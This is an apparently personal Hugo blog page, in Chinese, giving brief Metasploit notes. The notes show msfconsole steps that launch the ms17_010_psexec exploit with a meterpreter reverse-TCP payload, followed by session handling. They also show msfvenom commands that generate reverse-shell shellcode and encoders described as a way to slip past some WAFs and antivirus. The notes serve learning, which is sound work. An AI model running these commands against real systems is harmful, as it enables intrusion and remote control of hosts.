@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>msf - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="
+Metasploit Framework 简单用用
+" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="msf" />
+<meta property="og:description" content="
+Metasploit Framework 简单用用
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/msf/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-01-31T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-01-31T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="msf"/>
+<meta name="twitter:description" content="
+Metasploit Framework 简单用用
+"/>
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">ldrx30</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="http://localhost:1313/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">msf</h1>
+			<div class="meta">Posted on Jan 31, 2024</div>
+		</div>
+		
+
+		
+
+		<section class="body">
+			<blockquote>
+<p>Metasploit Framework 简单用用</p>
+</blockquote>
+<h2 id="msfconsole">msfconsole</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ msfconsole
+</span></span><span style="display:flex;"><span>msf6 &gt; search ms17_010                                                      <span style="color:#6272a4"># 寻找相关</span>
+</span></span><span style="display:flex;"><span>msf6 &gt; use <span style="color:#bd93f9">1</span>                                                                <span style="color:#6272a4"># search出的结果</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>windows/smb/ms17_010_psexec<span style="color:#ff79c6">)</span> &gt; show payloads                   <span style="color:#6272a4"># 显示可以使用的payloads</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>windows/smb/ms17_010_psexec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> payload windows/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>windows/smb/ms17_010_psexec<span style="color:#ff79c6">)</span> &gt; show options                    <span style="color:#6272a4"># exploit 参数</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>windows/smb/ms17_010_psexec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> LHOST 192.168.41.148        <span style="color:#6272a4"># 设置参数</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>windows/smb/ms17_010_psexec<span style="color:#ff79c6">)</span> &gt; exploit
+</span></span></code></pre></div><p>meterpreter 操作</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter&gt; shell
+</span></span><span style="display:flex;"><span>meterpreter&gt; background      <span style="color:#6272a4"># 返回msf</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>windows/smb/ms17_010_psexec<span style="color:#ff79c6">)</span> &gt; session -l    <span style="color:#6272a4"># 显示所有的session `session 0` 重新 attach</span>
+</span></span></code></pre></div><h2 id="msfvenom">msfvenom</h2>
+<p>后门生成，免杀</p>
+<p>寻找payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ msfvenom -l payload | grep linux
+</span></span><span style="display:flex;"><span>$ msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options
+</span></span></code></pre></div><p>生成shellcode</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># -p: payload</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -a: arch</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -f: format</span>
+</span></span><span style="display:flex;"><span>$ msfvenom -p linux/x86/meterpreter/reverse_tcp -a x86 --platform<span style="color:#ff79c6">=</span>linux <span style="color:#8be9fd;font-style:italic">LHOST</span><span style="color:#ff79c6">=</span>127.0.0.1 <span style="color:#8be9fd;font-style:italic">LPORT</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">9001</span> -f c
+</span></span></code></pre></div><p>encoder：可以过掉部分waf</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ msfvenom --list encoders
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -e: encoder</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -i: iterations，编码多次</span>
+</span></span><span style="display:flex;"><span>$ msfvenom -e php/base64 -i <span style="color:#bd93f9">10</span>  
+</span></span></code></pre></div><h2 id="other">other</h2>
+<p>生成随机字符串</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ msf-pattern_create -l <span style="color:#bd93f9">100</span>
+</span></span></code></pre></div>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/msf">msf</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		<div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        var disqus_shortname = 'ldrx30';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+
+</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  © ldrx30 |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
